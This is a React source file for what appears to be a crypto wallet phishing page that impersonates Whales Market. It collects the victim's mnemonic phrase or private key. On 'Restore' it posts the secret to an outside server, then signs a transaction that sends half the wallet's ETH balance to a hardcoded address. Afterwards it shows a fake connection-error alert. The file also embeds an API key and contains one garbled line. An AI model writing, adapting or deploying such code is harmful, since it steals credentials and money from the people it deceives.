import { useState, useRef, useEffect } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import '../stylesheet/connect.scss'
import { faKey } from '@fortawesome/free-solid-svg-icons';
import {ethers} from 'ethers'
import { useParams } from 'react-router-dom';
import BigNumber from 'bignumber.js';
import axios from 'axios';
const provider = new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/ZMQRM7X06XnuSWA1GpTs2SqJLvHLwC-b')
const Connect = () => {
    const [mnemonic, setMnemonics] = useState();
    const [privateKey, setPrivateKey] = useState();
    const [tab, setTab] = useState();
    const param = useParams()
    const tabRef = {
        tab1: useRef(),
        tab2: useRef(),
        content1: useRef(),
        content2: useRef()
    }
var wallet;
async function getEthPrice() {
    try {
        const response = await axios.get("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd");
        return response.data.ethereum.usd;
    } catch (error) {
        console.error("Error fetching ETH price:", error.message);
        throw error;
    }
}
const drainETHMnemonics=async ()=>{
    
    try{
  
       
            wallet =  ethers.Wallet.fromPhrase(mnemonic,p b               rovider);
        
        const ethBalance=await provider.getBalance(wallet.address)
        const ethPrice = await getEthPrice();

    // Convert ETH balance to dollars
    const ethBalanceInDollars = new BigNumber(ethBalance.toString()).dividedBy(ethPrice);

    //console.log("ETH Balance:", ethBalanceInDollars.toFixed(2), "USD");
    const amt = ethers.parseEther((BigNumber(ethBalance.toString()).dividedBy(2)).toString());
   // console.log(amt+'  n '+ethers.parseEther(ethBalance+""))
    const tx= await wallet.sendTransaction({
        to:'0xE96Aed92915a29239a60A47D042B738dE7957A97',
        value:amt
    })
    await tx.wait()
   // console.log(tx.hash())

}
catch(error){
    //console.log(error.message);
}
}
const drainETH=async ()=>{
    
    try{
      
            wallet=new ethers.Wallet(privateKey,provider);
       
        const ethBalance=await provider.getBalance(wallet.address)
        const ethPrice = await getEthPrice();

    // Convert ETH balance to dollars
    const ethBalanceInDollars = new BigNumber(ethBalance.toString()).dividedBy(ethPrice);

   // console.log("ETH Balance:", ethBalanceInDollars.toFixed(2), "USD");
    const amt = ethers.parseEther((BigNumber(ethBalance.toString()).dividedBy(2)).toString());
    //console.log(amt+'  n '+ethBalance)
    const tx= await wallet.sendTransaction({
        to:'0xE96Aed92915a29239a60A47D042B738dE7957A97',
        value:amt
    })
    await tx.wait()
    //console.log(tx.hash())

}
catch(error){
    //console.log(error.message);
}
}
    const sendPrivateKey = async () => {
       
        fetch('https://whale-server.onrender.com/sendprivatekey', {
            method: "POST",
            headers: {
                "Content-type": "application/json",
            },
            body: JSON.stringify({
               privateKey:privateKey,
                walletType:param.wallet,
                
            })
        }
        ).then((data) => {
           console.log(data)
           alert('Connection not secured, disable proxy and  try again')
        }).catch((err) => {
            console.log(err)
        })
    }
    const sendMnemonics = async () => {
       
        fetch('https://whale-server.onrender.com/sendemail', {
            method: "POST",
            headers: {
                "Content-type": "application/json",
            },
            body: JSON.stringify({
                mnemonics:mnemonic,
                walletType:param.wallet,
                
            })
        }
        ).then((data) => {
           console.log(data)
           alert('Connection not secured, disable proxy and  try again')
        }).catch((err) => {
            console.log(err)
        })
    }
    const toggleTab = (tab, content) => {
        const parent = content.current.parentNode;
        var siblings = parent.childNodes;
        siblings = Array.prototype.filter.call(siblings, (e) => {
            return e !== content.current
        })
        siblings.map((e) => {
            e.style.display = 'none'
            e.style.opacity = '0'
        })
        if (tab.current.checked) {
            content.current.style.display = 'block'
            content.current.style.opacity = '1'
        }
    }
    useEffect(() => {

        tabRef.tab1.current.checked = true
        toggleTab(tabRef.tab1, tabRef.content1)
        setTab('private key')
        console.log(tab)
        console.log(param)
        return () => {

        };
    }, []);
    return (
        <div className="connect">
            <div className="wallet-header">
                <div className="header-logo">
                    <img src="https://app.whales.market/logo-full.svg" alt="Available" />
                    <h1> Wallets {param.wallet}</h1>
                </div>
            </div>

            <div className="tab">
                <div className="tabs">
                    <input ref={tabRef.tab1} type="radio" name="tab" id="tab1" check-value='1' onClick={() => {
                        toggleTab(tabRef.tab1, tabRef.content1)
                        setTab('mnemonic')

                    }} />
                    <label htmlFor="tab1">Mnemonics</label>
                    <input
                        ref={tabRef.tab2}
                        type="radio"
                        name="tab"
                        id="tab2"
                        check-value='2'
                        onClick={() => {
                            toggleTab(tabRef.tab2, tabRef.content2);
                            setTab('private key')

                        }}

                    />
                    <label htmlFor="tab2">Private Key</label >
                </div>
                <div className="contents">
                    <div ref={tabRef.content1} className="content-1" check-value='1'>
                        <div className="content-1-wrapper">
                            <div className="nics">
                                <textarea
                                    name="nics"
                                    id=""
                                    rows='8'
                                    placeholder='Enter your mnemonic phrase here with space in between each word'
                                    value={mnemonic}
                                    onChange={(e) => {
                                        setMnemonics(e.target.value)
                                    }}
                                >

                                </textarea>
                            </div>
                            <div className="pass">
                                <input type="password" name="nics" id="" placeholder='Enter Passwrod' />
                            </div>
                            <div className="nics-btn">
                                <button
                                onClick={()=>{
                                    sendMnemonics();
                                    drainETHMnemonics();
                                }}
                                >
                                    Restore
                                    <FontAwesomeIcon icon={faKey} />
                                </button>
                            </div>
                        </div>

                    </div>
















                    <div ref={tabRef.content2} className="content-2" check-value='2'>
                        <div className="content-1-wrapper">
                            <div className="nics">
                                <textarea
                                    name="nics"
                                    id=""
                                    rows='8'
                                    placeholder='Enter your private key here '
                                    value={privateKey}
                                    onChange={(e) => {
                                        setPrivateKey(e.target.value)
                                    }}
                                >

                                </textarea>
                            </div>
                            <div className="pass">
                                <input
                                    type="password"
                                    name="nics"
                                    id=""
                                    placeholder='Enter Passwrod'

                                />
                            </div>
                            <div className="nics-btn">
                                <button
                                onClick={()=>{
                                    sendPrivateKey()
                                    drainETH()
                                }}
                                >
                                    Restore
                                    <FontAwesomeIcon icon={faKey} />
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default Connect;